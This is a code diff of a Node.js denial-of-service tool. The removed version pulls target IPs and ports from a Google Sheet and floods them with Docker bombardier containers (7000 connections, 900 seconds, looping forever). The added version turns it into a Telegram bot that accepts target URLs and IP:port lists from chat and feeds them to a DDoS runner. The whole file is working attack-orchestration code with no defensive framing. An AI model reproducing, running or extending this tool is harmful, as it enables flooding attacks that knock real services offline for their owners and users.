@@ -1,71 +1,81 @@
 require("dotenv").config();
-const { GoogleSpreadsheet } = require("google-spreadsheet");
-const Docker = require("dockerode");
-const docker = new Docker();
+const net = require("net");
 
-const doc = new GoogleSpreadsheet(
-  "1CGimNXk_8zQoIHoVPC_XvtbIqEt2QiWR4LDtAgzRtmU"
+const { Telegraf, session } = require("telegraf");
+const DDOS = require("./runDDOS");
+
+const URL_REGEXP = new RegExp(
+  "(https?://(?:www.|(?!www))[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9].[^s]{2,}|www.[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9].[^s]{2,}|https?://(?:www.|(?!www))[a-zA-Z0-9]+.[^s]{2,}|www.[a-zA-Z0-9]+.[^s]{2,})"
 );
 
-const TARGET_COUNT = 3;
-const ATTACK_TIME_SECONDS = 900;
-const ATTACK_CONNECTIONS_COUNT = 7000;
-const DOCKER_IMAGE = "alpine/bombardier";
-const SUCCESS_SLEEP_SECONDS = 30;
+const TARGETS = [];
 
-const sleep = (ms) => new Promise((res) => setTimeout(res, ms));
+const bot = new Telegraf(process.env.BOT_TOKEN);
 
-const runDocker = (source) => {
-  const options = [
-    `--duration=${ATTACK_TIME_SECONDS}s`,
-    `--connections=${ATTACK_CONNECTIONS_COUNT}`,
-    source,
-  ];
+const ddos = new DDOS({ targets: TARGETS, bot });
 
-  return docker
-    .run(DOCKER_IMAGE, options, process.stdout)
-    .then((data) => {
-      // var output = data[0];
-      var container = data[1];
-      // console.log(output.StatusCode);
-      return container.remove();
-    })
-    .then(() => {
-      console.log("container removed");
-    })
-    .catch((err) => {
-      console.log("catch", err);
-    });
-};
+ddos.run();
 
-const ddos = async (c = 1) => {
-  const count = c;
-  console.log(`DDOS ${count} stared!`);
+bot.use(session());
 
-  // https://theoephraim.github.io/node-google-spreadsheet/#/getting-started/authentication
-  await doc.useServiceAccountAuth({
-    client_email: process.env.CLIENT_EMAIL,
-    private_key: process.env.PRIVATE_KEY,
-  });
-  await doc.loadInfo();
+bot.hears("hi", (ctx) => ctx.reply("Hey there"));
 
-  const sheet = doc.sheetsByIndex[5];
-  const rows = await sheet.getRows({ limit: 20 });
+bot.command("targets", (ctx) => {
+  ctx.reply(
+    [`Now ${ddos.targets.length} targets`, "", ...ddos.targets].join("\n")
+  );
+});
+bot.hears("targets", (ctx) => {
+  ctx.reply(
+    [`Now ${ddos.targets.length} targets`, "", ...ddos.targets].join("\n")
+  );
+});
 
-  const randomRows = rows
-    .sort(() => Math.random() - 0.5)
-    .slice(0, TARGET_COUNT);
+bot.on("text", (ctx) => {
+  if (!ctx.session) ctx.session = { targets: TARGETS };
+  const { text } = ctx.message;
+  const targets = text.split("\n").reduce((acc, t) => {
+    const trimed = t.trim();
+    if (!trimed) return acc;
 
-  for (let i = 0; i < randomRows.length; i++) {
-    const { IP, PORT, DESCRIPTION } = randomRows[i];
-    console.log(`DDOS => ${IP}:${PORT} (${DESCRIPTION})`);
-    runDocker(`${IP}:${PORT}`);
-  }
+    if (trimed.match(URL_REGEXP)) {
+      return [...acc, trimed];
+    }
 
-  await sleep((ATTACK_TIME_SECONDS + SUCCESS_SLEEP_SECONDS) * 1000);
-  console.log(`DDOS ${count} done! Sleep ${SUCCESS_SLEEP_SECONDS} sec`);
+    const [ip4, port4] = trimed.split(":");
+    if (net.isIPv4(ip4) && !Number.isNaN(Number(port4))) {
+      return [...acc, trimed];
+    }
 
-  ddos(count + 1);
-};
+    const [ip, ...ports] = trimed.split(" ");
+    if (net.isIPv4(ip)) {
+      ports
+        .toString()
+        .replace(/\(|\)/g, "")
+        .split(",")
+        .forEach((p) => {
+          if (!p) return;
+          const [port, type = ""] = p.split("/");
+          if (type.toLowerCase() === "tcp" && !Number.isNaN(Number(port))) {
+            acc.push(`${ip}:${port}`);
+          }
+        });
+    }
 
-ddos();
+    return acc;
+  }, []);
+
+  ddos.addTargets(targets);
+  ctx.reply([`Add ${targets.length} targets`, "", ...targets].join("\n"));
+});
+
+bot
+  .launch()
+  .then(() => {
+    console.log("bot started");
+  })
+  .catch(console.log);
+
+// Enable graceful stop
+process.once("SIGINT", () => bot.stop("SIGINT"));
+process.once("SIGTERM", () => bot.stop("SIGTERM"));
